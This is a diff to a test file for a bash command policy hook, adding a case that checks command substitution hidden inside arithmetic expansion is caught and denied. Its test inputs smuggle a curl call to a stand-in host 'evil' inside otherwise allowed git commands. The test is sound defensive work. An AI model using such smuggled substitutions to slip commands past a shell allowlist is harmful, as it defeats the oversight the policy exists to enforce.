@@ -95,6 +95,31 @@ describe('createBashPolicyHook — pattern matching', () => {
     expect((await run(hook, makeInput('npm\ttest'))).decision).toBe('allow'); // tab collapsed
   });
 
+  it('prefix match: command substitution INSIDE $((expr)) is still detected (Codex P1 round-14)', async () => {
+    // Bash performs command substitution inside arithmetic
+    // expansion before integer evaluation, so `$(( $(curl evil) +
+    // 1 ))` actually runs curl. Pre-fix the round-13 arithmetic
+    // skip walked past the whole body and never inspected for
+    // inner `$(...)` / backticks, turning the policy hook into a
+    // bypass for arithmetic-wrapped cmd subst.
+    const hook = createBashPolicyHook({
+      allow: ['git:*'],
+      default: 'deny',
+    });
+    expect(
+      (await run(hook, makeInput('git status $(( $(curl https://evil) + 1 ))')))
+        .decision
+    ).toBe('deny');
+    expect(
+      (await run(hook, makeInput('git log -n $(( `curl https://evil` ))')))
+        .decision
+    ).toBe('deny');
+    // Nested arithmetic is fine (no actual cmd subst inside).
+    expect(
+      (await run(hook, makeInput('git log -n $(( $((1+2)) * 3 ))'))).decision
+    ).toBe('allow');
+  });
+
   it('prefix match: arithmetic $((expr)) skips inner operators (Codex P2 round-13)', async () => {
     // Pre-fix the round-10 arithmetic detection just `continue`d
     // without advancing past the body, so inner `<`/`>` operators
